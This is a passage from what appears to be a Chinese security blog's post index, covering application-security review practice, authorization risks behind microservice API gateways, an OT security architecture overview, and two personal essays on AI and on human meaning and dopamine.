安全运营团队执行。\n安全运营通常侧重于被动事件监控和响应，以及针对漏过检测的对手的主动威胁搜寻。 威胁情报和事件准备功能通常在安全运营中孵化，但随着它们的成熟并被集成到技术和组织流程中，它们会转移到更广泛的范围。\n创建一个健康的反馈循环对于安全所有部分的有效性（以及成熟的安全流程）至关重要。\n我们预计，随着团队越来越多地自动化技术流程并采用专注于快速敏捷迭代的 DevOps 风格流程，预防和响应之间的关系将继续变得更加紧密。\n\n附加信息•NIST 网络安全框架 - https://www.nist.gov/cyberframework\n","categories":["安全架构"],"tags":["安全建设","网络安全架构体系参考"]},{"title":"应用安全评审中的三个关键节点及抓手实现","url":"/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E8%AF%84%E5%AE%A1%E4%B8%AD%E7%9A%84%E4%B8%89%E4%B8%AA%E5%85%B3%E9%94%AE%E8%8A%82%E7%82%B9%E5%8F%8A%E6%8A%93%E6%89%8B%E5%AE%9E%E7%8E%B0/","content":"如何快速感知项目立项？如何感知应用上线？如何跟踪应用迭代？越权漏洞频发如何解决？\n\n前言应用安全如何做？这是一个老生常谈的问题，那为什么还要提这个话题呢？在笔者经历了短暂的两年多的应用安全建设来看，SDL的完整落地是一个很大的难题。当然，像其中的培训、代码扫描以及应急响应这几部分，各种落地方案很成熟，也就不提了。应用安全建设的本质就是运营，最难落地的差不多就是安全评审了。\n如何进行安全评审，从方法论来看也不是什么难题，通过STRIDE威胁建模模型和DREAD威胁评级模型，再融入公司的实际情况，一份定制化的评审CheckList差不多就可以出炉了。然后问题就来了，在哪个环节切入？通过什么方式？如何持续运营？\n安全评审需要介入的三个节点立项时、上线时、迭代时。\n立项时：根基不牢地动山摇，这个阶段需要进行架构安全评审。架构安全评审的必要性在于可以用最小的成本解决最大的风险，如果架构性安全问题在这个阶段未被发现，后续会随着一次次迭代，修复成本和风险都会急剧上升。\n上线时：现在的白盒扫描，更多的是发现代码层漏洞，但是对于架构相关和业务相关的风险，就有心无力了。这也就引出了应用上线安全评审的必要性，验证立项评审阶段的风险是否存在，同时评审其有没有业务逻辑相关风险(越权、敏感信息等)。\n迭代时：现在的开发思路大多都是快速立项、快速上线、持续迭代，也就导致了大部分的功能是在后期迭代过程中上线的，经过笔者的简单统计，当应用完成度在90%以上时，迭代新增的接口约占80%以上，换句话说，绝大多数的web接口都没有经过安全评审就暴露到公网当中去了，成为无数的攻击面，进而导致了权限相关安全风险的频发。\n立项时–快速感知如何做到快速感知？笔者了解到的有这么几种：\n一是和PD混熟，有新项目时及时同步，这种方法具有局限性，适合应用比较少的公司或者公司的某条业务线；\n二是利用现有平台，往往在中台支撑部门、工程效能部门等，会有一些环节可以感知到立项，财务部门也是一个非常好的环节。这个时候就要发挥敏锐的嗅觉，找到这样的点，然后形成联动。这些平台大概率会接受合作，一则可以提升该平台的价值，二来可以提升其影响力；\n三是自立门户成为入口，这种方案的思想是让项目在安全平台上立项，想要实现需要运气。为什么这么说呢，想要做这件事，需要大量的人员投入和强制的流程更改，能决定这事的往往需要CXO的支持，要想获得他们的支持，就需要一个影响足够大的安全风险。不过据笔者所知，有几家大公司就是这么做的。\n第一种方案，灵活性太强，效果时好时坏，笔者在很长一段时间里都是用这种方法，最后的结果很惨，随着业务的迅速发展，项目评审率跌至很低的水位。\n第二种方案的可行性非常强，是一个成本低效果好的抓手。但是有一个问题是，项目非常多怎么办？笔者现在的思路是按照项目的等级来评审，项目等级的划分有很多种方法，例如人日、业务线等等\n第三种方案就不提了，时刻准备着，机会来了抓紧。\n当找到了有效的抓手时，一定要记得带上数据安全、业务安全等，这个阶段的主要风险往往集中在风控、合规等。\n上线时–发布卡点上线发布卡点，这个做起来就非常容易了，嵌入到应用构建平台中去就可以实现。有一个问题是，为什么不每次发布都卡点呢？\n其实去看一下构建平台的发布记录就知道了，过于频繁，完全无法运营，所以只能退而求其次，卡住第一次上线发布。\n迭代时–持续跟踪上边说到“迭代新增的接口约占80%以上”，这就是一个超级大风险，迭代接口的安全性全依赖于开发的安全意识和应急响应。虽然在上线后会有持续的黑盒扫描，但是目前还没有哪个工具可以低误报、低风险的发现权限相关漏洞吧。\n在上线评审那里有说到过，构建平台的发布记录非常多，如果依赖这个去评审迭代，会消耗大量的精力，当应用只有两位数时还能勉强运营，但是当应用数量上升到几百、几千的时候，每天最多迭代几十万行代码，怕是不吃不喝也搞不定了。\n这里讲一下笔者的思路，commit监控：\n1、每隔一段时间自动拉取commit记录；2、获取应用源码进行解析（白盒代码扫描工具中大多都可以做到源码解析，笔者是自己实现的）；3、解析diff记录，获取新增web接口；4、通过污点跟踪结合关键方法(permission等)大致判断风险指数(这个笔者实现起来效果不是很好，几乎每个应用都有自己独特的鉴权逻辑，通用程度低)。\n\n只需要这几步，即可以实现应用新增web接口的跟踪。可能还有一些其它通用接口平台，其实跟踪思想也是类似。\n不过在笔者的运营过程中发现，还是会存在新增接口过多的情况，现在采用的是优先级的方案（重点应用、发生过高危风险的应用等），发现新增接口后，大部分情况下，人工快速审计下代码就可以发现风险了，当然还是会存在各种奇葩的鉴权逻辑，这时候就要和开发交流了。\n这段时间的运营感受就是，随着覆盖应用的增多，每天要读代码量也开始快速上升，不过效果还是很明显的。第4点的自动化分析需求愈加迫切。\n总结总结下就是，三个节点，关键之处在于找到这三个节点的抓手，充分利用现有资源，如果实在没有，那就创造抓手。用技术的思路去做运营，用创业的心态去做产品。\n本文纯属笔者的经验之谈，如有偏颇之处，还望指出，不甚感谢。\n","categories":["应用安全"],"tags":["THINK"]},{"title":"微服务架构下的越权风险","url":"/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E4%B8%8B%E7%9A%84%E8%B6%8A%E6%9D%83%E9%A3%8E%E9%99%A9/","content":"\n\n一篇小文，主要是通过安全的视角来简单讨论一下微服务架构下容易出现的一些去权限安全问题，涉及到开发细节说错的时候还望谅解。\n\n\n一、微服务与微服务架构微服务是一种开发软件的架构和组织方法，其中软件由通过明确定义的 API 进行通信的小型独立服务组成。这些服务由各个小型独立团队负责；采用UNIX设计的哲学，每种服务只做一件事，是一种松耦合的能够被独立开发和部署的无状态化服务。\n微服务具有两个关键特性：自主性、专用性，具有敏捷性、灵活扩展、轻松部署、技术自由、可重复使用的代码、弹性等优势[1]。\n\n从上边的描述可以看出，微服务更多的是一种方法，而微服务架构则是实践微服务的具体实现，不同厂商、不同开发的实现方式各有差异，大概架构基本如下图[2]。它使得开发可以专注自由的开发他负责的服务，解决了系统的复杂性，可以独立部署，与DevOps开发流程契合等，这也难怪现在几乎全民微服务了。\n\n但是哪有什么银弹，优点越多的技术带来的负面影响往往越大。\n二、微服务的访问权限困境在微服务架构下，一个应用被拆分为多个微服务，这样一来，原先单体架构下的权限体系就不再能满足微服务的鉴权需求了，每个微服务都需要对自身API进行权限管控，需要对接账号体系和明确哪些角色有权限访问；同时还有来自服务之间的调用等。\n在这种情况下，无论是通过session方案还是token方案，都需要开发去自己维护这一权限体系，那么问题就来了。业务产品在后边追，各种发布封网在前边拦，往往会为了完成业务功能而取舍掉权限的部分，又或者不同的开发同学对于鉴权的理解不一致，甚至认为判断有没有登陆就认为已经完成了权限校验。\n随着这类API的越来越多，就会发现同类安全问题频繁发生，特别是未授权访问这类低级的漏洞。\n\n三、绕不过的API Gateway一方面为了管理乱糟糟的API调用关系，一方面为了解决上边提到的风险，微服务的调用需要一个统一管控的部分，也就是API Gateway。现在是不是就不会出现越权漏洞了呢？\n想法是美好的，但现实往往啪啪打脸，Gateway的架构缺陷往往会造成更大的风险。\n\nAPI Gateway 仅仅是个出入口\n\n这类网关往往只起到了一个路由的作用，它可能只有一个域名和简单的路由转发功能，将同一部分业务的API通过同一个域名开发出去，将API的权限校验全部交给相应的开发去搞，当出现未授权访问漏洞时，双方就开始扯皮，这个权限校验不是你应该做的吗？特别是当这业务特别庞大时，几百几千个API都接入，这可真是个灾难～\n\nAPI Gateway 通过黑名单控制访问权限\n\n有时候需要控制一部分API开放公网另一部分不对外开放，有时候一部分API需要访问控制另一部分可以公开访问等。在解决这类需求时，很多开发会把API Gateway设计成黑名单模式，例如不能对外开发的API需要添加到blacklist中，又或者需要做菜单访问控制的API需要主动去配置。从文字上，这貌似没有什么问题，合情又合理，但是回到人性上，人是健忘的和怕麻烦的，所以就导致经常出现内部API忘了配置blacklist开放公网或忘了配置权限菜单造成未授权访问漏洞的情况。\n\nAPI自动编排服务\n\n这两年出现了一些提供快速搭建应用能力的平台，通过网关能力，编排能力以及多种类型的服务对接、统一开放的服务市场，来完成服务发现，服务生产，服务消费的全链路的服务流程。这对于非开发的同学开发应用或帮助开发同学快速发布应用，是很有意义的，但是随之而来的就是它的权限校验问题，在编排时，权限判断逻辑是否是必选项、接入账号体系后是否有角色配置关联、是否支持数据权限的校验等等，任何一个点出现问题，整个平台的应用可能都会存在风险。\n随着这类情况越来越多，通过应用数量来看业务规模已经不太行的通了，有时候一个应用可能会有几百上千个API[3]，背后又对应着几十上百个开发，对于传统的SDL来说太难落地了[4]，关于API的安全治理，是一个复杂的体系，有机会细聊。\n(这难道不是越权漏洞挖掘的思路嘛)\n\n四、基于API Gateway权限校验的一些想法实际的API Gateway设计涉及到多个方面，安全和性能往往在一个平衡的状态，下边的仅供参考\n\n安全工程师可以不介入到每个应用进行安全评审，但是API Gateway类的应用一定要覆盖和持续跟进\n\n在调用者和被调用者中间加一层网关，每次调用时进行权限校验。充分利用API网关，完成将身份验证和路由功能\n\n在Gateway或账号管理平台上维护API与角色的关系，在Gateway判断API与角色是否匹配，可以解决访问权限(垂直权限)越权的风险\n\n当通过API Gateway控制router时，公网可访问的列表用白名单方式，只有主动添加才可以对外开放\n\n每个微服务的开发都应该为其数据访问权限负责\n\n\n\n五、这个世界是一个圆关于Service Mesh架构我们下次再聊。\n\n每一次开发架构的更迭，都会带来新的安全挑战，现在越来越火的Serverless、FaaS等也一定会带来一系列新的安全挑战，说不定再过一段时间又回到了最初的单体架构。\n\n参考：\n[1]https://aws.amazon.com/cn/microservices/\n[2]http://dockone.io/article/3687\n[3]API安全全链路解决方案写了好久，但是还有几个关键点在实践场景中没有跑顺畅，再等等(没有实践，没有发言权)\n[4]DevSecOps同样，在实践的路上，还不敢拿出来班门弄斧\n[5]图片来源网络\n","categories":["应用安全"],"tags":["THINK"]},{"title":"我的应用安全方法论：路在脚下","url":"/%E6%88%91%E7%9A%84%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%96%B9%E6%B3%95%E8%AE%BA%EF%BC%9A%E8%B7%AF%E5%9C%A8%E8%84%9A%E4%B8%8B/","content":"\n\n在2020即将结束之际，将自己对于应用安全建设的一些思考记录成此文，与诸位探讨未来的应用安全之路，一家之言，不要当真\n\n\n在前几年，各种文章/会议，每当提起应用安全，PPT总会出现类似的这张图\n\n这几年又都换上了这张图\n\n仿佛用原来的那些安全能力，照着DevSecOps的流程重新画一个图，就可以将原先解决不了的难题解决掉，但真的是这么简单吗？\n一、应用安全困境经常看到某些安全公司各种画大饼，说网络安全从业缺口xxx万，听起来这个行业仿佛是个蓝海，但实际上，哪个公司会去雇用这么多的安全工程师呢？在一二线互联网公司，“应用安全工程师:开发工程师=1:500”应该是个很常见的比例，甚至有些公司会更高，攻防只会是工作中的极少部分，更多的则是“柴米油盐”。\n在应用的开发速度上，也和以前有了很大的变化，商业环境的瞬息万变，促使其要不断的、快速的开发新应用来支撑新的业务，例如社区团购、全民买菜等，需要在很短的时间内上线，并且要不断的进行迭代，应用的运行环境也发生了很大的变化，Web、APP、小程序、云原生等等。\n\n简单总结一下现在遇到的困境：应用数量、场景的快速增加、功能迭代周期短，原来的SDL流程无法融入到新的开发模式中，致使很多风险发布到线上才被发现或直到被利用还没有感知。\n在笔者这几年参与应用安全建设的过程中，对其有着很深刻的感触，很多时候，面对那么多的应用，那么多的风险，深深的无力感。\n出现问题的时候，其他人总是会问或者扪心自问，这个风险出现的原因是什么？为什么没有提前发现？后续可以覆盖到吗？现在或许可以试着回答一下这个问题。\n二、我认为的应用安全发展趋势经过这几年的实践总结，在这里和大家探讨下如何“困境突围”。\n首先，对于DevSecOps，其中的很多观点笔者是比较认同的，但是和很多人的认知不一样的地方是，更多的是将其视作一个方法论，就像SOAR、UEBA等一样，而不是其一个执行框架。在SDL的阶段，很多人在衡量应用安全建设完成度的时候，会将每个环节是否都覆盖作为其标准，但这显然是一个伪命题，100%的覆盖度在现实中是不存在的。\n在笔者看来，应用安全的发展趋势有这么三点：\n1、业务、产品、开发、测试、安全五者之间合作关系的转变，所有人都要为应用安全负责；\n2、安全风险的发现要融入到“开发-测试-部署”的流程中去，在上线前发现风险；\n3、安全自动化(安全运营可持续化、安全流程自动化、风险感知自动化)。\n单从这几个观点来看，似乎和DevSecOps中的某些观点有相似之处，事实也确实如此，但是需要再强调一遍，DevSecOps更多的是一种方法、一种思想，我们可以学习其长处，切不可照猫画虎。\n三、我对现在SDL中一些流程的看法在讲笔者是如何讲上述三个观点落地之前，先谈一下笔者对其现在SDL流程中一些大家都在做的流程的看法：\n1、应用安全/安全开发/安全意识培训时讲漏洞类型(OWASP Top10等)是一种低效的行为；\n根据笔者培训的经验来看，真实的case是直击人心且令人印象深刻的，用一个小时讲实际中漏洞类型，特别是XSS、CSRF等，会使听众昏昏欲睡。这里不是说安全培训不重要，恰恰相反，安全培训是提升开发安全意识的一个重要手段，关键是面对不同的人群针对性的去选择培训素材和培训方式，如果能达到“开发主动来咨询安全解决方案”的效果，那培训便算得上是成功的。\n2、强制性的流程卡点是一种偷懒的行为；\n做安全运营的同学往往有种思维惯性，希望在所有环节都做上卡点，这种行为/想法是非常不利于合作关系转变的。换位思考下，谁希望每一步操作都要受到阻碍，与开发效率提升相背而行。\n四、我的应用安全方法论回到正题，对于应用安全的建设，笔者是如何探索落地的呢？下边一一道来。\n首先，我们要清楚，应用漏洞的种类那么多，在大公司，要保护大量应用、海量数据的安全，最应该解决的是哪几种风险呢？\n1、数据批量泄漏的风险；\n2、权限管控不完善的风险；\n3、命令执行/SQL注入/服务器接管等高危漏洞的风险。\n或许这里会有人提到监管风险，例如网络安全法、GDPR、等保等，因其往往属于安全合规或数据安全的范畴，且不在笔者的认知范围内，这里暂且不提。\n理清了关键风险，那么怎么做就会更清晰一点了，笔者讲其方法论归纳为三个环节来谈，分别是：\n1、应用安全开发：在漏洞代码上线前发现风险；\n2、应用安全评估：通过红蓝对抗、安全众测、漏洞扫描等发现已上线的漏洞；\n3、应用异动感知：高危/核心应用的异动监控、感知。\n\n第一点：应用安全开发我们的目标是尽可能的避免存在漏洞(特别是高危漏洞)的代码发布到线上。\n这里笔者将漏洞分为常规漏洞(SQLI、XSS、SSRF等)、业务逻辑漏洞(越权漏洞、短信爆破等)两类。\n常规漏洞：这类风险就依赖安全开发框架、DAST、IAST、RASP等等安全工具了，工具链越完善，该类漏洞就会越少，这本就是安全专业范围内的事情，本文就不展开讲了。\n业务逻辑漏洞：现在不管哪家的SRC，收到的高危漏洞中，越权漏洞一定是占比最大的部分，至今也没有看到一个运营成本低、误报率低的越权类漏洞扫描器的出现。其实这个也可以理解，前几年笔者也试图去开发一个越权扫描器，但是效果却不如想象中的美好，究其原因就是，业务形态的多变、开发风格的不同，导致了越权漏洞表象上大多一样，原理逻辑上却大相径庭，这也就是现在基于流量重放的越权扫描器效果相对好一些的原因所在。\n既然越权扫描器解决不了全部的业务逻辑类漏洞，那么试着去改变一下生产关系呢？业务、产品、开发、测试、安全五者之间合作关系的转变，所有人都要为应用安全负责。\n解决业务逻辑漏洞的方法笔者将其拆解为三个动作：架构安全评审、QA覆盖、风险复盘。\nI. 架构安全评审\n为什么要做架构评审呢？原因可以参见这篇文章微服务架构下的越权风险，开发方式、开发架构的转变，出现了很多类Gateway的应用，这些应用的架构如果没有安全参与评估，往往会导致整个系统出现框架性的权限失效，且修复起来难度极大。\n这里要注意的是，不是所有应用都要去参与架构安全评审，不然很容易又陷入到“人力配比”的困境中去，根据实际情况来选择评审策略。\nII. QA覆盖\nQA环节的人力往往是充裕的，并且会将覆盖所有的发布和迭代，那么试想一下，如果测试同学帮我们做一部分安全测试的工作，那岂不是既可以大幅提高覆盖度，又可以将安全的经历集中到其它环节。\n那怎么去做呢？第一，要清楚业务逻辑类漏洞，既是漏洞、又是BUG，达成共识的关键；第二，测试同学不是专业的安全，所以不可能覆盖所有的漏洞类型，要有选择的有的放矢，侧重于越权等风险类型；第三，那就是风险复盘了。\nIII. 风险复盘\n即使前边经过了各种评审和测试，一定还会有漏洞被发布到线上，这时候就要进行深度的风险复盘，复盘的目的是什么呢？找出漏洞出现的根本原因，如果是应用架构有问题，那便拉项目，改架构，如果是人的问题，那便要思考下安全意识的问题了。至于哪些风险需要复盘，这个则要根据当前的安全形势，有选择性的去复盘。其中一个关键点就是，开发、产品、测试都要参与到复盘中去。\n第二点：应用安全评估红蓝对抗、安全众测、漏洞扫描等详细的流程本文也就不展开说了，有非常多的文章介绍这些方面，笔者着重谈一下该环节的重要性。\n安全评估环节相当于是一个查漏补缺，检验安全开发环节效果的作用，要同黑灰产进行时间竞赛，力争先于他们发现风险。\n该阶段发现的风险，每一个风险都是投入了非常多人力、物力、财力换来的，要充分的利用其价值，而不是修复了事。\n每一个通过该环节发现的高危风险，都应该与“风险复盘”进行闭合，深入其中发现出现风险的根本原因。\n第三点：应用异动感知笔者根据应用安全中的风险，将异动感知划分为三个部分，分别是：爬虫攻防、漏洞利用、非漏洞性数据泄漏。\nI. 爬虫攻防\n说起爬虫攻防，笔者真是一把辛酸泪，在面对海量的流量时，如何准确的区分机器流量和正常流量就已经是一件很困难的事情了，如果在机器流量中快速准确的发现爬虫流量，特别是高级爬虫，是非常有挑战的一项工作。每个公司有不同的爬虫对抗平台，或者是选择爬虫风险管理，此处笔者不再赘述。\nII. 漏洞利用\n此处“漏洞”更多指的是“命令执行/SQL注入/服务器接管等高危漏洞”，特别是近几年，供应链漏洞频发，在应用安全中，一旦没有有效的全覆盖的推动供应链漏洞修复，则极有可能被外部利用攻击，那我们该怎么办呢？常见的感知方法有两个，分别是：蜜罐、WAF，当然有些团队会基于各种流量日志构建攻击检测平台，检测各种payload，以达到在漏洞被利用时快速发现的目的，笔者因没有构建过类似系统，更多的是使用，所以细节相关的就不多讲了。\nIII. 非漏洞性数据泄漏\n“非漏洞性数据泄漏”怎么理解呢？讲一个场景，例如某个客服的账号被盗用，然后将该客服权限下的数据批量盗取，那这种风险如何避免呢？有些同学可能会认为这不是应用安全的范畴，但实际上，只要是从应用上泄漏的数据，都是属于应用安全该去防护的范围。\n这里笔者推荐的方法是UEBA(获取多个维度的行为数据、日志，将其通过基础分析方法、高级分析方法，进行建模分析，识别异常行为的风险用户和风险实体，然后通过打分评级的方式输出告警，使安全工程师可以优先级处理告警)，针对不同的高风险敞口进行监控。目前市面上也有不少基于UEBA方法论的产品落地，各家公司内部也或多或少会有类似实现，分析算法都已经很成熟了，更多的还是根据不同的业务场景制定不同的策略。\n本文没有像其它介绍企业安全建设的文章那样将方方面面都讲到，主要集中在应用安全的视角，来探讨如何保证应用的安全。上述提到的很多个点可能看起来有点独立，其实并非如此，因为还有一个方法论没有提到，那就是SOAR，可参看从SOAR中求解应用安全建设强运营突围之法，将各个环节自动化的进行编排，使安全能在整个DevOps流程中游刃有余。如果只是将SOAR看作是一个有控制台拖拖拽拽的样子，那就有些狭隘了。\n有许许多多的方法论，许许多多的安全建设的文章，但“听过很多道理 却依然过不好这一生”，每个公司的实际情况都不一样，如一味的追求方法论的完成落地，往往很难取得很好的效果。应用安全建设之路在何方？路在脚下。\n[1]文中部分图片来源自网络[2]文中部分参考文章链接来源公众号：电驭叛客\n","categories":["应用安全"],"tags":["THINK"]},{"title":"操作技术(OT)安全架构参考","url":"/%E6%93%8D%E4%BD%9C%E6%8A%80%E6%9C%AF(OT)%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E5%8F%82%E8%80%83/","content":"#安全架构网络安全架构体系参考——操作技术(OT)安全架构参考\n\n\n“在OT和工业物联网环境中应用零信任原则”\n\n\n操作技术 (OT) 和工业物联网环境由控制物理设备的计算机组成。 这包括供暖、通风和空调 (HVAC) 系统等常见技术，以及用于制造、石油和天然气设施、公用事业、交通运输、市政基础设施等的行业特定设备。 这些 OT 系统通常在 IT 环境中进行监控，以提供业务分析和对物理业务运营的其他洞察。\n虽然底层计算平台和 IP 网络与 IT 相似，但这些 OT 环境在几个方面有所不同：\n• 安全是主要的OT 安全保证，这与IT 主要关注知识产权的机密性形成鲜明对比（尽管两者都关注系统和数据的完整性和可用性）。 这种差异是因为 OT 系统故障可能直接导致人身伤害或死亡（例如，在重型机械上或附近工作的员工、使用/消费产品的客户、在实体设施附近生活/工作的公民等）。 此外，其中一些系统距离可以访问或重新启动它们的最近技术人员数百英里/公里。\n•与 IT 系统相比，OT 硬件/软件比较陈旧，因为物理设备的运行生命周期比典型的 IT 系统长得多（在许多情况下是 10 倍）。 找到 50 或 100 年历史的设备（有些仍然由蒸汽驱动！）在 30 到 50 年前被现代化为电子控制系统的情况并不罕见。\n•OT 安全有所不同，因为这些系统在构建时通常没有考虑到现代威胁和协议（并且通常依赖于“生命终结”软件）。 许多成熟的 IT 安全最佳实践（如软件修补）在 OT 环境中并不实用或完全有效，因此只能有选择地应用（或安全效果有限）。 OT 的基本安全始于网络隔离（包括对隔离边界的良好维护/监控）、威胁监控以及仔细管理供应商访问风险。\nPurdue Model自 1990 年代以来，Purdue 企业参考架构 (PERA)，即 Purdue 模型，一直是组织（有时是分离）企业和工业控制系统 (ICS) 安全措施和网络功能的标准模型。\n•     0-3 级（OT 环境）变化不大，并且在今天仍然适用。\n•     4 级和 5 级（IT 环境）反映了一种较旧的企业访问控制方法，由于移动和云技术的出现，这种方法正在以零信任原则进行转变。\n\nBlended Attacks网络安全攻击越来越多地跨越 IT、物联网、OT 和工业物联网环境，要求事件响应流程（和预防策略）融合为跨越这些环境的统一方法（同时仍然根据每个环境的功能和限制进行定制）。\n\nCloud Connections组织越来越多地将 OT 环境与基于云的业务分析相连接，以深入了解生产力、敏捷性和工作流管理等。\n\nIsolation and Segmentation可用于提供隔离和分段的控制措施通常从使用以下任一方式将 OT 环境与公司内部网和互联网隔离开始\n•    硬边界 - 完全断开流量，通常在物理上拔掉插头以形成“air gap”\n•    软边界- 基于防火墙或其他网络流量过滤器。\n防火墙和忽略风险 - 与任何安全边界一样，软边界需要监控和维护才能随着时间的推移保持有效。 不幸的是，我们看到许多情况下，组织设置防火墙规则来阻止流量，但没有应用完整的人员/流程/技术方法将安全性集成到变更管理中，仔细监控异常，持续审计变更，测试边界 攻击模拟等\n\n•     内部分段——组织还可以通过将 OT 系统组彼此隔离来进一步分段，以进一步阻止攻击。 就像在 IT 环境中一样，这种做法需要通信/流量模式与这种方法以及持续的维护、审计、异常管理和其他严格的流程兼容。\n这些安全实践很好地应用了零信任原则，尽管由于 OT 系统的时代，它们受限于静态配置和网络控制。\n\nMicrosoft Defender for IoTMicrosoft 的威胁监控方法专注于引入现代安全方法，同时也深刻尊重这些系统的限制和敏感性。 该方法基于 CyberX 开发的技术（最近被微软收购并集成）。\n解决方案包括\n•    Network TAP/SPAN（被动收集）——通过被动流量监控提供数据收集，以避免OT和IIoT操作中断。 这种被动方法至关重要，因为主动扫描可能会减慢或中断业务运营（可能会改变敏感的物理操作时间或可能会导致旧的 OT 计算机系统崩溃）。\n•     适用于物联网的 Microsoft Defender 的传感器和分析通常位于 OT 环境中，以快速解析流量并获得即时的本地洞察力。 这些受益于 OT 的确定性/一致性性质（一天发生的事情几乎与其他一天发生的事情相同）\n•     本地控制台可以为物理流程的操作员（除了安全操作分析师）提供即时的本地洞察（安全性和生产力）。\n•    Microsoft Defender for IoT 还提供了一个管理控制台，用于跨多个传感器捕获和关联洞察，并提供对安全操作攻击检测、清单、漏洞评估、攻击模拟等的洞察。\n•    这可以在 OT 环境（以尊重隔离边界）或 IT 环境（以更好地与融合的 IT/OT/IoT/IIoT 检测/响应/恢复流程集成）中进行离线托管。\n•    这包括将攻击检测映射到 MITRE ATT&amp;CK 框架。\n该解决方案方法通过明确验证环境的安全状态并假设攻击者可能会破坏系统并尝试访问 OT 系统，从而体现了零信任原则。\n\nMicrosoft Sentinel IntegrationMicrosoft Defender for IoT 还为你提供了在 Microsoft Sentinel 中集成云分析、编排和剧本的选择。\n配置 Microsoft Sentinel 与 Microsoft Defender for Cloud 的集成提供\n•    本地 OT 调查和修复手册•     与 Microsoft Sentinel 中的其他数据源（IT、IoT、物理系统等）的相关性•     技术威胁情报（IOC 等）和战略威胁情报（攻击组和环境）的集成\n\n","categories":["安全架构"],"tags":["安全建设","网络安全架构体系参考"]},{"title":"未来已来，从智人到智能","url":"/%E6%9C%AA%E6%9D%A5%E5%B7%B2%E6%9D%A5%EF%BC%8C%E4%BB%8E%E6%99%BA%E4%BA%BA%E5%88%B0%E6%99%BA%E8%83%BD/","content":"\n说来也巧，从ChatGPT3.5发布前后的差不多日子，我打开了人类简史这本书，到ChatGPT4发布的时候读完，这种感觉很奇妙，一边回顾着从智人到现代人类的7万年，一边经历着或许是人类的重大转折点，震撼、恐惧、担忧、期待的情绪轮番涌上心头。\n历史上的每一个时间点，都像是一个十字路口。虽然从过去到现在已经只剩单行道，但到未来却有无数岔路可走。其中某些路比较宽、比较平坦，路标比较明确，所以也是比较可能的选择。然而，历史有时候就是选了一些完全出人意料的道路。\n回望智人的过去，7万年前，“认知革命”让人类历史正式开启，从1万2千年前，“农业革命”逐渐加速了进化速度，而从500年前到现在，我们经历了“科学革命”，科学成了我们的信仰，而从现在到未来10年，我们将经历如何的Revolution，“肉体飞升”或是“精神永生”。\n我们真正应该认真对待的，是在于下一段历史改变不仅是关于科技和组织的改变，更是人类意识与身份认同的根本改变。这些改变触及的会是人类的本质，就连“人”的定义都有可能从此不同。我们还有多久时间？没有人真正知道。\n作者可能也难以置信，短短的几年之后，这个问题便有了答案，真正面临的难题也到来了。\n回到当下，现在的这些AI虽然足够震撼却不够颠覆，仍是基于过去500年的科学革命之上，但是仅仅这些，已足以彻底改变我们当前的生活方式，当我用10年前Mac Pro生成出第一张AI图像的时候，我知道，这场巨变，已经没有人可以阻止了。这个变化快的让我们难以追赶，虽然现在问ChatGpt“你的存在会让程序员失业吗”，它的回答是不会，确实不会，但是现在它已经让编程成为了门槛极低的技能，编程、影像创作、音乐创作和网络上的方方面面，都成为了每个人都可以触手可及的，70亿人参与的“智能进化”。\n人类几乎从出生到死亡都被种种虚构的故事和概念围绕，让他们以特定的方式思考，以特定的标准行事，想要特定的东西，也遵守特定的规范。就是这样，让数百万计的陌生人能遵照着这种人造而非天生的直觉，合作无间。这种人造的直觉就是“文化”。\n我不知道这个变化对于当前的工作有什么影响，也不想去讨论，因为这毫无意义，因为我们谁也无法预测接下来要发生的事情，但是可以确定的是，一切都将巨变。\n或许可以说我们正在天堂和地狱的岔路口，而我们还不知道自己会朝向哪一个方向。历史还没告诉我们该挑哪边，而只要发生某些巧合，往哪边走都不算意外。\n真正的“电驭”时代大幕开启了。\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"本来无一物，何处惹尘埃","url":"/%E6%9C%AC%E6%9D%A5%E6%97%A0%E4%B8%80%E7%89%A9%EF%BC%8C%E4%BD%95%E5%A4%84%E6%83%B9%E5%B0%98%E5%9F%83/","content":"除了存在于人类共同的想象之外，这个宇宙中根本没有神、没有国家、没有钱、没有人权、没有法律，也没有正义。不管是自由人／奴隶、白人／黑人、富人／穷人，都只是虚构的想象所建构出来的。国家、神祇、公司、金钱、意识形态——都是我们创造并相信的集体幻影，人类历史就是由它们统治的。\n人类几乎从出生到死亡都被种种虚构的故事和概念围绕，让他们以特定的方式思考，以特定的标准行事，想要特定的东西，也遵守特定的规范。就是这样，让数百万计的陌生人能遵照着这种人造而非天生的直觉，合作无间。这种人造的直觉就是“文化”。等到文化出现，就再也无法停止改变和发展，这些无法阻挡的变化，就成了我们说的“历史”。\n这个观点在过去半年里对我的世界观产生了强烈的冲击，甚至可以说是棒喝，从这一刻，那个问题有了答案。\n“我们存在的意义是什么？”\n要思考存在的意义，首先要知道我们是什么，我们什么都不是，我们和蚂蚁、老鼠、细菌、一草一木、世间万物都没有任何本质的区别，我们只是构成的一部分，只是宇宙的一粒尘埃。现在我们身边的一切，除了生物本能，其它一切都是虚构的，金钱、政权、阶级……所以抛去虚构的部分，我们存在的意义便是“存在”，存在便是我们存在的意义，仅此而已。\n（好了，以上的都是废话）\n本文其实真正想讨论的是，抛去虚构的一切，我们追求的到底是什么，是具象的物还是一种感觉？\n我们希望能富有、希望能成名、希望能青史留名、希望能帮助他人、希望子孙满堂……每个人都有自己想要拥有的东西，这一切，最终都是为了获得什么呢？\n是什么让我们“想要拥有、希望获得”呢？生物本能的一部分“多巴胺”（碳基躯壳、自私基因、内啡肽、睾酮、神经递质…..构成我们生物本能的物质太多，仅以此为例），因为它太重要又太有趣了。\n“拥有是无趣的，只有获得才更有趣”。\n多巴胺会给我们带来快乐，但不是因为“拥有”会快乐，而是“拥有”-“预期”=快乐，所以当我们“拥有”的时候，”预期“就等于“拥有”了，而我们想要继续获得快乐，就要拥有更多的“预期”，“满怀希望的旅途比到达目的地更快乐”。\n“一旦老鼠知道什么时候能得到食物，就没有惊喜了。但是如果你不定期扔下食物，让食物的出现一直成为惊喜，会怎么样呢？如果用人和短视频或者金钱分别代替老鼠和食物丸，会怎么样？”，为什么短视频会那么容易让我们不停的下一个，消磨掉大把的时间，因为当你期望下一个短视频更精彩时，但是索然无味时，多巴胺的激发速率就会快速下降，而这种感觉会我们感觉很糟糕，但是当某一个短视频非常精彩时，又会让多巴胺激增，获得超预期的“快乐”。但是在刷完短